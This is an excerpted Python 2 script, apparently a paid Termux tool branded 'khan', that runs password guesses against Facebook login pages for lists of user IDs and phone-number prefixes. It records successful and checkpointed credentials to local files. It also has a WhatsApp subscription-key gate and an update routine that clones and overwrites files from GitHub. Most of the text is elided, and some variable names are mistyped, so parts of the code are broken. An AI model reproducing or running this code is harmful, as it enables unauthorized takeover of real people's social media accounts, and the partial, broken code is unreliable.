...
try:
    ...
    logo ="""
 \033[1;94m _______      \033[1;93m _     _     \033[1;95m _______
    \033[1;94m |         \033[1;93m |_____|     \033[1;95m |______
    \033[1;94m |         \033[1;93m |     |     \033[1;95m |______
...
\033[1;94m##     ##  #######  ##     ##  ######  #### ##    ##                                                                                  
           ...
           -----------------------------
          | CODED BY : THE khan       |
          | WHATSAPP : +923305196677    |
          | FB PAGE  : khan TRICKER   |
           -----------------------------
         \x1b[1;41m\x1b[1;92mSYC0 TH3 BR4ND \x1b[1;0m'
"""
dec = '2'
server = '2'
...
def main_apv():
    ...
    print logo
    try:
        key1 = open('/sdcard/.khan.txt', 'r').read()
    except IOError:
        os.system('clear')
        print logo
        print '\033[1;91m You dont have an subscrption'
        print '           ELLOW BROTHER THIS COMMANDS ARE PAID'
        print '           SUBSCRIPTION LENE K LIYE SAB SE PIHLY AWPNE '
        print '           ADMIN SE RABTA KRNA HOGA'
        print '           IF UH WANT APPROVAL THEN PRESS ENTER'
        print '           CONTACT MEH ON WhatsApp'
        print ''
        myid = uuid.uuid4().hex[:30]
        print ' \033[1;92mYOUR KEY : ' + myid + imt
        kok = open('/sdcard/.khan.txt', 'w')
        kok.write(myid + imt)
        kok.close()
        print ''
        print '           THIS IS YOUR KEY'
        print '           SEND MEH ON WHatsApp ThaNKEW'
        print ''
        print ''
        print ''
        print '     IF UH HAVE GET SUBSCRIPTION'
        raw_input('    GO BACK AND PUT LAST COMMAND ')
        os.system('xdg-open https://wa.me/+923305196677')

    r1 = requests.get('https://raw.githubusercontent.com/muzamml134')
    if key1 in r1:
        main_system()
    else:
        os.system('clear')
        ...
        print '\033[1;91m You dont have an subscrption'
        print '           ELLOW BROTHER THIS COMMANDS ARE PAID'
        print '\033[1;92m SUBSCRIPTION LENE K LIYE SAB SE PIHLY AWPNE '
        print '           ADMIN SE RABTA KRNA HOGA'
        print '           IF UH WANT APPROVAL THEN PRESS ENTER'
        print '           CONTACT MEH ON WhatsApp'
        print ''
        print '\033[1;91m   YOUR KEY : ' + key1
        print ''
        print '_\033[1;93mTHIS IS YOUR KEY'
        print '           SEND MEH ON WHatsApp ThaNKEW'
        print ''
        print ''
        print ''
        print '\033[1;92mIF UH HAVE GET SUBSCRIPTION'
        raw_input('    GO BACK AND PUT LAST COMMAND ')
        os.system('xdg-open https://wa.me/+923305196677')
...
def main_system():
    ...
    print '\x1b[1;94m[3]   File Cloning       \x1b[1;92m (No Login)'
    print '\x1b[1;91m[4]   File Making Menu\x1b[1;92m    (Login)'
    print '\x1b[1;94m[5]   Check Subscription '
    print '\x1b[1;94m[6]   Update Tools'
    print '\x1b[1;94m[7]   For Any Help Massage WhatsApp'
    print 43 * '~'
...
def main_input():
    ...
    if mx == '1':
        ...
        print ''
        print ''
        print '\x1b[1;92m        Congratulations Bro You Are Now'
        print '\x1b[1;92m        Member Of The khan Paid Commands '
        print '\x1b[1;91m        ENJOY  THE JOURNEY '
        time.sleep(3.5)
        main_system()
    elif mx == '6':
        os.system('git clone https://github.com/muzamml134')
        os.system('rm -rf khan')
        os.system('cp -f khan/khan \\.')
        os.system('rm -rf khan')
        os.system(' cd khan')
...
def numcloning():
    ...
    print '\x1b[1;93m\n     Example 0300 0345 0320 0334 0310  '
    print ''
    ...
    def main(arg):
        ...
        try:
            ...
            p = khan.get('https://mbasic.facebook.com')
            b = khan.post('https://mbasic.facebook.com/login.php', data={'email': uid + user, 'pass': pass1, 'login': 'submit'})
            if 'c_user' in khan.cookies.get_dict().keys():
                print '\x1b[1;92m[khan-OK] ' + coc + user + ' | ' + pass1
                ok = open('khan-ok.txt', 'a')
                ok.write(uid + ' | ' + pass1 + '\n')
                ok.close()
                oks.append(uid + pass1)
            elif 'checkpoint' in khan.cookies.get_dict().keys():
                print '\x1b[1;91m[khan-CP] ' + coc + user + ' | ' + pass1
                cp = open('khan-cp.txt', 'a')
                cp.write(uid + ' | ' + pass1 + '\n')
                cp.close()
...
def mineExt():
    ...
    print g + '[=] Extracting From The khan : ' + my_line[:15]
    ...
    print ''
    print ''
    print sm + '[=] Total Extract IDZ : ' + str(len(count)) + w
    print ''
...
def xokpauto():
    ...
    def main(arg):
        ...
        try:
            ...
            p = khan.get('https://mbasic.facebook.com')
            b = khan.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pass1, 'login': 'submit'})
            if 'c_user' in khan.cookies.get_dict().keys():
                print '\x1b[1;92m[khan-OK] ' + uid + ' | ' + pass1
                ok = open('khan-ok.txt', 'a')
                ok.write(uid + ' | ' + pass1 + '\n')
                ok.close()
                oks.append(uid + pass1)
                ...
                khan.headers.update({'Host': 'mbasic.facebook.com', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'user-agent': myagents, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'accept-encoding': 'gzip, deflate', 'upgrade-insecure-requests': str(random.randint(100, 200)), 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
                p = khan.get('https://mbasic.facebook.com')
                b = khan.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pass2, 'login': 'submit'})
                if 'c_user' in khan.cookies.get_dict().keys():
                    print '\x1b[1;92m[khan-OK] ' + uid + ' | ' + pass2
                    ok = open('khan-ok.txt', 'a')
                    ok.write(uid + ' | ' + pass2 + '\n')
                    ok.close()
                    oks.append(uid + pass2)
                elif 'checkpoint' in khan.cookies.get_dict().keys():
                    print '\x1b[1;91m[khan-CP] ' + uid + ' | ' + pass2
                    cp = open('khan-cp.txt', 'a')
                    cp.write(uid + ' | ' + pass2 + '\n')
                    cp.close()
                    ...
                    pass3 = first + '123'
                    khan = requests.Session()
                    khaj.headers.update({'Host': 'mbasic.facebook.com', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'user-agent': myagents, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'accept-encoding': 'gzip, deflate', 'upgrade-insecure-requests': str(random.randint(100, 200)), 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
                    p = khan.get('https://mbasic.facebook.com')
                    b = khan.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pass3, 'login': 'submit'})
                    if 'c_user' in khan.cookies.get_dict().keys():
                        print '\x1b[1;92m[khan-OK] ' + uid + ' | ' + pass3
                        ok = open('khan-ok.txt', 'a')
                        ok.write(uid + ' | ' + pass3 + '\n')
                        ok.close()
                        oks.append(uid + pass3)
                    elif 'checkpoint' in khan.cookies.get_dict().keys():
                        print '\x1b[1;91m[khan-CP] ' + uid + ' | ' + pass3
                        cp = open('khan-cp.txt', 'a')
                        cp.write(uid + ' | ' + pass3 + '\n')
                        cp.close()
                        ...
                        khan.headers.update({'Host': 'mbasic.facebook.com', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'user-agent': myagents, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'accept-encoding': 'gzip, deflate', 'upgrade-insecure-requests': str(random.randint(100, 200)), 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
                        p = khan.get('https://mbasic.facebook.com')
                        b = khan.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pass4, 'login': 'submit'})
                        if 'c_user' in khan.cookies.get_dict().keys():
                            print '\x1b[1;92m[khan-OK] ' + uid + ' | ' + pass4
                            ok = open('khan-ok.txt', 'a')
                            ok.write(uid + ' | ' + pass4 + '\n')
                            ok.close()
                            oks.append(uid + pass4)
                        elif 'checkpoint' in khan.cookies.get_dict().keys():
                            print '\x1b[1;91m[khan-CP] ' + uid + ' | ' + pass4
                            cp = open('khan-cp.txt', 'a')
                            cp.write(uid + ' | ' + pass4 + '\n')
                            cp.close()
                            ...
                            khan.headers.update({'Host': 'mbasic.facebook.com', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'user-agent': myagents, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'accept-encoding': 'gzip, deflate', 'upgrade-insecure-requests': str(random.randint(100, 200)), 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
                            p = khan.get('https://mbasic.facebook.com')
                            b = khan.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pass5, 'login': 'submit'})
                            if 'c_user' in khan.cookies.get_dict().keys():
                                print '\x1b[1;92m[khan-OK] ' + uid + ' | ' + pass5
                                ok = open('khan-ok.txt', 'a')
                                ok.write(uid + ' | ' + pass5 + '\n')
                                ok.close()
                                oks.append(uid + pass5)
                            elif 'checkpoint' in khan.cookies.get_dict().keys():
                                print '\x1b[1;91m[khan-CP] ' + uid + ' | ' + pass5
                                cp = open('khan-cp.txt', 'a')
                                cp.write(uid + ' | ' + pass5 + '\n')
                                cp.close()
    ...
    def main(arg):
        ...
        try:
            ...
            if 'c_user' in khan.cookies.get_dict().keys():
                ...
                print '\x1b[1;91m[khan-CP] ' + uid + ' | ' + pass1
                cp = open('khan-cp.txt', 'a')
                cp.write(uid + ' | ' + pass1 + '\n')
                cp.close()
                cps.append(uid + pass1)
                    ...
                    if 'c_user' in khan.cookies.get_dict().keys():
                        ...
                        if 'c_user' in khan.cookies.get_dict().keys():
                            ...
                            if 'c_user' in khan.cookies.get_dict().keys():
                                ...
                                print '\x1b[1;91m[Ikhan-CP] ' + uid + ' | ' + pass5
                                cp = open('khan-cp.txt', 'a')
                                cp.write(uid + ' | ' + pass5 + '\n')
                                cp.close()
                                cps.append(uid + pass5)
...
def c_f_p_pass():
    ...
    os.system('echo " -----------------------------------"| lolcat')
    print '    Cracking Start Please Wait ...'
    print '    Use Flight Mode For For Speed Up'
    os.system('echo " -----------------------------------"| lolcat')
        ...
        try:
            ...
            if 'c_user' in khan.cookies.get_dict().keys():
                ...
                if 'c_user' in khan.cookies.get_dict().keys():
                    ...
                    khan.headers.update({'Host': 'mbasic.facebook.com', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'user-agent': lines, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'accept-encoding': 'gzip, deflate', 'upgrade-insecure-requests': str(random.randint(100, 200)), 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
                    p = khan.get('https://mbasic.facebook.com')
                    b = khan.post('https://m.facebook.com/login.php', data={'email': uid, 'pass': pass3, 'login': 'submit'})
                    if 'c_user' in khan.cookies.get_dict().keys():
                        print '\x1b[1;92m[khan-OK] ' + uid + ' | ' + pass3
                        ok = open('khan-ok.txt', 'a')
                        ok.write(uid + ' | ' + pass3 + '\n')
                        ...
                        khan = requests.Session()
                        khan.headers.update({'Host': 'mbasic.facebook.com', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'user-agent': lines, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'accept-encoding': 'gzip, deflate', 'upgrade-insecure-requests': str(random.randint(100, 200)), 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
                        p = khan.get('https://m.facebook.com')
                        b = khah.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pass4, 'login': 'submit'})
                        if 'c_user' in khan.cookies.get_dict().keys():
                            print '\x1b[1;92m[khan-OK] ' + uid + ' | ' + pass4
                            ok = open('khan-ok.txt', 'a')
                            ok.write(uid + ' | ' + pass4 + '\n')
                            ...
                            khan.headers.update({'Host': 'mbasic.facebook.com', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'user-agent': lines, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'accept-encoding': 'gzip, deflate', 'upgrade-insecure-requests': str(random.randint(100, 200)), 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
                            p = khan.get('https://mbasic.facebook.com')
                            b = khan.post('https://m.facebook.com/login.php', data={'email': uid, 'pass': pass5, 'login': 'submit'})
                            if 'c_user' in khan.cookies.get_dict().keys():
                                print '\x1b[1;92m[khan-OK] ' + uid + ' | ' + pass5
                                ok = open('khan-ok.txt', 'a')
                                ok.write(uid + ' | ' + pass5 + '\n')
                    ...
                    if 'c_user' in khan.cookies.get_dict().keys():
                        ...
                        if 'c_user' in khan.cookies.get_dict().keys():
                            ...
                            if 'c_user' in khan.cookies.get_dict().keys():
                                ...
                                khan.headers.update({'Host': 'mbasic.facebook.com', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'user-agent': lines, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'accept-encoding': 'gzip, deflate', 'upgrade-insecure-requests': str(random.randint(100, 200)), 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
                                p = khan.get('https://mbasic.facebook.com')
                                b = khan.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pass6, 'login': 'submit'})
                                if 'c_user' in khan.cookies.get_dict().keys():
                                    print '\x1b[1;92m[khan-OK] ' + uid + ' | ' + pass6
                                    ok = open('khan-ok.txt', 'a')
                                    ok.write(uid + ' | ' + pass6 + '\n')
                                    ok.close()
                                    oks.append(uid + pass6)
                                elif 'checkpoint' in khan.cookies.get_dict().keys():
                                    print '\x1b[1;91m[khan-CP] ' + uid + ' | ' + pass6
                                    cp = open('khan-cp.txt', 'a')
                                    cp.write(uid + ' | ' + pass6 + '\n')
                                    cp.close()
